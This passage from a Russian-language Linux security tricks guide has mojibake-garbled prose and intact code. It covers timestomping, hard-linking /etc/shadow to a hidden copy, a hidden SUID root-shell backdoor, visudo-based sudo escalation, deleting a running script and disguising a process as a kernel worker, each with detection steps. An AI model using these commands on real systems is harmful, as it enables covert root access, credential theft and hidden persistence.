*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –£—Ç–∏–ª–∏—Ç–∞ `touch` —Å —Ñ–ª–∞–≥–æ–º `-r` (–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –º–µ—Ç–∫–∏ —Å –¥—Ä—É–≥–æ–≥–æ —Ñ–∞–π–ª–∞) –∏–ª–∏ `-d` (—É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –¥–∞—Ç—É).
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –°–¥–µ–ª–∞—Ç—å –≤–∏–¥, —á—Ç–æ .bashrc –Ω–µ –º–µ–Ω—è–ª—Å—è —Å–æ –≤—Ä–µ–º–µ–Ω —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å–∏—Å—Ç–µ–º—ã
    touch -r /etc/hosts ~/.bashrc
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ü—Ä–æ–≤–µ—Ä—è—Ç—å `crtime` (–≤—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è) —á–µ—Ä–µ–∑ `stat`. –ï—Å–ª–∏ `Modify` —Ä–∞–Ω—å—à–µ `Birth`, —ç—Ç–æ –ø—Ä–∏–∑–Ω–∞–∫ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—ã –∫–æ–Ω—Ç—Ä–æ–ª—è —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ (AIDE).

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 2.3. –°–æ–∑–¥–∞–Ω–∏–µ –∂–µ—Å—Ç–∫–æ–π —Å—Å—ã–ª–∫–∏ –Ω–∞ —Å–∫—Ä—ã—Ç—É—é –∫–æ–ø–∏—é

*   **üéØ –¶–µ–ª—å:** –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª—É –¥–∞–∂–µ –ø–æ—Å–ª–µ –µ–≥–æ "—É–¥–∞–ª–µ–Ω–∏—è".
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ñ–µ—Å—Ç–∫–∞—è —Å—Å—ã–ª–∫–∞ (`ln`) —Å–æ–∑–¥–∞–µ—Ç –µ—â–µ –æ–¥–Ω–æ –∏–º—è –¥–ª—è —Ç–æ–≥–æ –∂–µ inode. –§–∞–π–ª –±—É–¥–µ—Ç —É–¥–∞–ª–µ–Ω —Å –¥–∏—Å–∫–∞ —Ç–æ–ª—å–∫–æ –∫–æ–≥–¥–∞ —Å—á–µ—Ç—á–∏–∫ —Å—Å—ã–ª–æ–∫ –Ω–∞ inode —Å—Ç–∞–Ω–µ—Ç —Ä–∞–≤–µ–Ω –Ω—É–ª—é.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    ln /etc/shadow /tmp/.secret_copy
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–∫–∞—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ –æ–¥–∏–Ω –∏ —Ç–æ—Ç –∂–µ inode: `find / -samefile /etc/shadow`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 2.4. –ó–∞—â–∏—Ç–∞ —Ñ–∞–π–ª–æ–≤ —á–µ—Ä–µ–∑ –∞—Ç—Ä–∏–±—É—Ç –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ—Å—Ç–∏ (`immutable`)

*   **üéØ –¶–µ–ª—å:** –ó–∞—â–∏—Ç–∏—Ç—å —Ñ–∞–π–ª –æ—Ç –ª—é–±—ã—Ö –∏–∑–º–µ–Ω–µ–Ω–∏–π –∏–ª–∏ —É–¥–∞–ª–µ–Ω–∏—è, –¥–∞–∂–µ –æ—Ç `root`.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –£—Ç–∏–ª–∏—Ç–∞ `chattr` —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –Ω–∞ —Ñ–∞–π–ª –∞—Ç—Ä–∏–±—É—Ç `i` (immutable).
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –ö–æ–º–∞–Ω–¥—ã —Ç—Ä–µ–±—É—é—Ç –ø—Ä–∞–≤ root
    chattr +i /etc/hosts
    rm /etc/hosts # Operation not permitted
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–∫–∞—Ç—å —Ç–∞–∫–∏–µ —Ñ–∞–π–ª—ã —Å –ø–æ–º–æ—â—å—é `lsattr -R /`. –°–Ω—è—Ç—å –∞—Ç—Ä–∏–±—É—Ç –º–æ–∂–µ—Ç —Ç–æ–ª—å–∫–æ `root` –∫–æ–º–∞–Ω–¥–æ–π `chattr -i <—Ñ–∞–π–ª>`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

## –£—Ä–æ–≤–µ–Ω—å 3: –ü—Ä–∞–≤–∞ –∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏

–¢—Ä—é–∫–∏, –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ –Ω–∞ –ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π, —Å–æ–∑–¥–∞–Ω–∏–µ –±—ç–∫–¥–æ—Ä–æ–≤ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–µ–æ—á–µ–≤–∏–¥–Ω—ã—Ö –∞—Å–ø–µ–∫—Ç–æ–≤ —Å–∏—Å—Ç–µ–º—ã –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 3.1. –ë—ç–∫–¥–æ—Ä —á–µ—Ä–µ–∑ SUID/SGID –±–∏—Ç

*   **üéØ –¶–µ–ª—å:** –°–æ–∑–¥–∞—Ç—å –ª–∞–∑–µ–π–∫—É –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –¥–æ `root`.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ù–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∫–æ–ø–∏—é `/bin/bash`) —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è SUID-–±–∏—Ç. –ü—Ä–∏ –∑–∞–ø—É—Å–∫–µ —Ç–∞–∫–æ–π —Ñ–∞–π–ª –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –ø—Ä–∞–≤–∞–º–∏ —Å–≤–æ–µ–≥–æ –≤–ª–∞–¥–µ–ª—å—Ü–∞ (`root`), –∞ –Ω–µ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ root
    cp /bin/bash /usr/local/bin/.root-shell
    chmod u+s /usr/local/bin/.root-shell
    # –ü–æ–∑–∂–µ –æ—Ç –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
    /usr/local/bin/.root-shell -p # –î–∞–µ—Ç root-—à–µ–ª–ª
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–∫–∞—Ç—å SUID-—Ñ–∞–π–ª—ã: `find / -perm -u=s -type f 2>/dev/null`. –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–∑–¥–µ–ª—ã —Å –æ–ø—Ü–∏–µ–π `nosuid`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 3.2. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –æ—Ç `root`

*   **üéØ –¶–µ–ª—å:** –í—Ä–µ–º–µ–Ω–Ω–æ —Å–¥–µ–ª–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ–π –¥–∞–∂–µ –¥–ª—è `root`.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ `000` –Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –ª–∏—à–∞–µ—Ç –≤—Å–µ—Ö, –≤–∫–ª—é—á–∞—è `root`, –ø—Ä–∞–≤–∞ –Ω–∞ –≤—Ö–æ–¥ (`x`). `root` –Ω–µ –º–æ–∂–µ—Ç –≤–æ–π—Ç–∏ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é, –ø–æ–∫–∞ –Ω–µ —Å–º–µ–Ω–∏—Ç –ø—Ä–∞–≤–∞.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    chmod 000 /path/to/secret_dir
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–∫–∞—Ç—å –∞–Ω–æ–º–∞–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞: `find / -perm 000`. `root` –º–æ–∂–µ—Ç –≤–µ—Ä–Ω—É—Ç—å –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ `chmod 755`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 3.3. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ ACL (Access Control Lists)

*   **üéØ –¶–µ–ª—å:** –ü—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª—É –≤ –æ–±—Ö–æ–¥ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –ø—Ä–∞–≤ `rwx`.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** `setfacl` –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–¥–∞—Ç—å –ø—Ä–∞–≤–∞ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –≤–∏–¥–Ω—ã –≤ `ls -l` (—Ç–∞–º –ø–æ—è–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ `+`).
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    setfacl -m u:hacker:rw- secret.txt
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `getfacl <—Ñ–∞–π–ª>` –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –ø–æ–ª–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –ø—Ä–∞–≤.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 3.4. –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–∏–µ–º —Ñ–∞–π–ª–æ–≤ —Å –ø–æ–º–æ—â—å—é "Sticky Bit"

*   **üéØ –¶–µ–ª—å:** –†–∞–∑—Ä–µ—à–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ñ–∞–π–ª—ã –≤ –æ–±—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –Ω–æ –∑–∞–ø—Ä–µ—Ç–∏—Ç—å –∏–º —É–¥–∞–ª—è—Ç—å —á—É–∂–∏–µ —Ñ–∞–π–ª—ã.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** "Sticky bit" (`+t`) –Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —É–¥–∞–ª—è—Ç—å —Ñ–∞–π–ª—ã –≤ –Ω–µ–π –º–æ–∂–µ—Ç —Ç–æ–ª—å–∫–æ –≤–ª–∞–¥–µ–ª–µ—Ü —Ñ–∞–π–ª–∞, –≤–ª–∞–¥–µ–ª–µ—Ü –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –∏–ª–∏ `root`.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    mkdir /shared; chmod 777 /shared; chmod +t /shared
    # –¢–µ–ø–µ—Ä—å –≤ /shared –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –Ω–µ —Å–º–æ–≥—É—Ç —É–¥–∞–ª–∏—Ç—å —á—É–∂–∏–µ —Ñ–∞–π–ª—ã
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** `ls -ld` –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç `t` –≤ –∫–æ–Ω—Ü–µ –ø—Ä–∞–≤. –≠—Ç–æ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º, –Ω–æ —Å—Ç–æ–∏—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –µ–≥–æ –Ω–∞–ª–∏—á–∏–µ –≤ –Ω–µ—Ç–∏–ø–∏—á–Ω—ã—Ö –º–µ—Å—Ç–∞—Ö.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 3.5. Help Yourself

*   **üéØ –¶–µ–ª—å:** –û—Å—Ç–∞–≤–∏—Ç—å "–∫–≤–µ—Å—Ç" –∏–ª–∏ —à—É—Ç–∫—É –¥–ª—è –¥—Ä—É–≥–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ (–∏–ª–∏ –¥–ª—è —Å–µ–±—è –≤ –±—É–¥—É—â–µ–º). –°—É—Ç—å –∫–≤–µ—Å—Ç–∞: —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª–Ω—ã–µ –ø—Ä–∞–≤–∞ `root`, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –¥–æ–≥–∞–¥–∞—Ç—å—Å—è, —á—Ç–æ –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–∞—è –¥–æ—Å—Ç—É–ø–Ω–∞—è –µ–º—É `sudo` –∫–æ–º–∞–Ω–¥–∞ ‚Äî —ç—Ç–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–º–æ–≥–æ —Ñ–∞–π–ª–∞ `sudoers`.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –≠—Ç–æ—Ç —Ç—Ä—é–∫ ‚Äî –ø—Ä–∏–º–µ—Ä –∏—Ä–æ–Ω–∏—á–Ω–æ–π –∏ –∫—Ä–∞–π–Ω–µ –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –¥–∞–µ—Ç—Å—è –ø—Ä–∞–≤–æ —Å –ø–æ–º–æ—â—å—é `sudo` –∑–∞–ø—É—Å–∫–∞—Ç—å —Ä–µ–¥–∞–∫—Ç–æ—Ä (`visudo`, `vi`) —Ç–æ–ª—å–∫–æ –¥–ª—è –æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ ‚Äî `/etc/sudoers`. –≠—Ç–æ —Å–≤–æ–µ–≥–æ —Ä–æ–¥–∞ "–ª–æ–≤—É—à–∫–∞": –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å–æ–æ–±—Ä–∞–∑–∏—Ç–µ–ª–µ–Ω, –æ–Ω –æ—Ç–∫—Ä–æ–µ—Ç —ç—Ç–æ—Ç —Ñ–∞–π–ª –∏ —Å–∞–º —Å–µ–±–µ –ø—Ä–æ–ø–∏—à–µ—Ç –ø–æ–ª–Ω—ã–µ –ø—Ä–∞–≤–∞. –ê –ø–µ—Ä–µ–¥ —ç—Ç–∏–º –ø–æ–ª–µ–∑–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–º–∞–Ω–¥—É `sudo -l`, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ "–∫–≤–µ—Å—Ç–∞":** –°—Ç–∞—Ä—à–∏–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä —Ä–µ—à–∞–µ—Ç –ø–æ–¥—à—É—Ç–∏—Ç—å –Ω–∞–¥ –º–ª–∞–¥—à–∏–º (`junior_admin`) –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –≤ `/etc/sudoers` –ø—Ä–∞–≤–∏–ª–æ:
        ```
        # –ó–∞–¥–∞–Ω–∏–µ –¥–ª—è junior_admin: –Ω–∞–π–¥–∏ —Å–ø–æ—Å–æ–± –ø–æ–ª—É—á–∏—Ç—å root
        junior_admin ALL=(root) /usr/sbin/visudo
        ```

    2.  **–†–µ—à–µ–Ω–∏–µ –∫–≤–µ—Å—Ç–∞ (–æ—Ç –∏–º–µ–Ω–∏ `junior_admin`):**
        ```bash
        # junior_admin –ø—ã—Ç–∞–µ—Ç—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–±—ã—á–Ω—É—é –∫–æ–º–∞–Ω–¥—É - –Ω–µ—É–¥–∞—á–∞
        sudo apt update
        # Sorry, user junior_admin is not allowed to execute '/usr/bin/apt update' as root.

        # junior_admin –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Å–≤–æ–∏ –ø—Ä–∞–≤–∞
        sudo -l
        # Output: User junior_admin may run the following commands on this host:
        #             (root) /usr/sbin/visudo

        # –ê–≥–∞! –û–Ω –∑–∞–ø—É—Å–∫–∞–µ—Ç –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—É—é –¥–æ—Å—Ç—É–ø–Ω—É—é –∫–æ–º–∞–Ω–¥—É
        sudo visudo

        # –í —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ –æ–Ω –¥–æ–±–∞–≤–ª—è–µ—Ç —Å–µ–±–µ —Å—Ç—Ä–æ–∫—É –¥–ª—è –ø–æ–ª–Ω—ã—Ö –ø—Ä–∞–≤:
        # junior_admin ALL=(ALL:ALL) ALL

        # –°–æ—Ö—Ä–∞–Ω—è–µ—Ç, –≤—ã—Ö–æ–¥–∏—Ç –∏... —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤—Å–µ–º–æ–≥—É—â–∏–º
        sudo su -
        ```
*   **ü§î –ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è –∏ –†–∏—Å–∫–∏:**
    *   **–ü–æ—á–µ–º—É —ç—Ç–æ –ø–ª–æ—Ö–∞—è —à—É—Ç–∫–∞:** –í —Ä–µ–∞–ª—å–Ω–æ–π —Å—Ä–µ–¥–µ —ç—Ç–æ –Ω–µ —à—É—Ç–∫–∞, –∞ –æ–≥—Ä–æ–º–Ω–∞—è –¥—ã—Ä–∞ –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –õ—é–±–æ–π, –∫—Ç–æ –ø–æ–ª—É—á–∏—Ç –¥–æ—Å—Ç—É–ø –∫ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ `junior_admin`, –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –ø–æ–ª—É—á–∏—Ç `root`.
    *   **–ö–∞–∫ –ø—Ä–∞–≤–∏–ª—å–Ω–æ:** –ü—Ä–∏–Ω—Ü–∏–ø –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –≥–ª–∞—Å–∏—Ç: –¥–∞–≤–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –∫ —Ç–µ–º –∫–æ–º–∞–Ω–¥–∞–º, –∫–æ—Ç–æ—Ä—ã–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã. –ï—Å–ª–∏ –Ω—É–∂–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∫—Ä–∏–ø—Ç ‚Äî –¥–∞–≤–∞–π—Ç–µ –ø—Ä–∞–≤–æ –Ω–∞ —Å–∫—Ä–∏–ø—Ç, –∞ –Ω–µ –Ω–∞ —Ä–µ–¥–∞–∫—Ç–æ—Ä. –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –¥–∞–≤–∞–π—Ç–µ –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ `sudoers` –Ω–∏–∫–æ–º—É, –∫—Ä–æ–º–µ –≥–ª–∞–≤–Ω—ã—Ö –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ —Å–∏—Å—Ç–µ–º—ã.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

## –£—Ä–æ–≤–µ–Ω—å 4: –ü—Ä–æ—Ü–µ—Å—Å—ã –∏ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ

–¢—Ä—é–∫–∏, —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å –∂–∏–∑–Ω–µ–Ω–Ω—ã–º —Ü–∏–∫–ª–æ–º –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: –∏—Ö –∑–∞–ø—É—Å–∫–æ–º, –º–∞—Å–∫–∏—Ä–æ–≤–∫–æ–π –∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ–º.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 4.1. "–£–¥–∞–ª–µ–Ω–∏–µ" —Ä–∞–±–æ—Ç–∞—é—â–µ–≥–æ —Ñ–∞–π–ª–∞

*   **üéØ –¶–µ–ª—å:** –°–∫—Ä—ã—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –ø–æ—Å–ª–µ –µ–≥–æ –∑–∞–ø—É—Å–∫–∞.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** `rm` —É–¥–∞–ª—è–µ—Ç –∏–º—è —Ñ–∞–π–ª–∞, –Ω–æ —è–¥—Ä–æ –¥–µ—Ä–∂–∏—Ç –µ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –≤ –ø–∞–º—è—Ç–∏, –ø–æ–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å —Ä–∞–±–æ—Ç–∞–µ—Ç. –ü—Ä–æ—Ü–µ—Å—Å –µ—Å—Ç—å, –∞ —Ñ–∞–π–ª–∞ –Ω–∞ –¥–∏—Å–∫–µ ‚Äî –Ω–µ—Ç.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    ./my_script.sh & 
    rm ./my_script.sh
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** `lsof | grep '(deleted)'`. –ü—Ä–æ–≤–µ—Ä—è—Ç—å `/proc/<PID>/exe`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 4.2. –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ (Process Masquerading)

*   **üéØ –¶–µ–ª—å:** –ó–∞–º–∞—Å–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–¥ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, `[kworker]`).
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ü—Ä–æ–≥—Ä–∞–º–º–∞ –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å —Å–≤–æ–µ –∏–º—è (`argv[0]`) –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ `prctl()`.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä (Python):
    ```python
    import ctypes, time
    new_name = b"[kworker/u8:0]"
    try:
        libc = ctypes.CDLL('libc.so.6')
        libc.prctl(15, new_name, 0, 0, 0) # 15 = PR_SET_NAME
        time.sleep(60)
    except:
        pass
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –°—Ä–∞–≤–Ω–∏–≤–∞—Ç—å –∏–º—è –∏–∑ `ps` —Å —Ä–µ–∞–ª—å–Ω—ã–º —Ñ–∞–π–ª–æ–º –≤ `/proc/<PID>/exe`. –ü—Ä–æ–≤–µ—Ä—è—Ç—å `/proc/<PID>/status` –Ω–∞ `TracerPid`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 4.3. –û—Ç—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –æ—Ç —Ç–µ—Ä–º–∏–Ω–∞–ª–∞ (Daemonization)

*   **üéØ –¶–µ–ª—å:** –°–¥–µ–ª–∞—Ç—å —Ç–∞–∫, —á—Ç–æ–±—ã –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–æ–¥–æ–ª–∂–∏–ª —Ä–∞–±–æ—Ç–∞—Ç—å –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è —Ç–µ—Ä–º–∏–Ω–∞–ª–∞.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ü—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–µ—Ç –ø–æ—Ç–æ–º–∫–∞ (`fork()`), –∞ —Å–∞–º –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è. –ü–æ—Ç–æ–º–æ–∫ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è "—Å–∏—Ä–æ—Ç–æ–π" –∏ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –ø–æ–¥ –æ–ø–µ–∫—É `init` (PID 1).
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä (Bash):
    ```bash
    (nohup ./my_script.sh &) && exit
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ò—Å–∫–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å—ã —Å —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–º PID 1 (`ps -ef --forest`). 

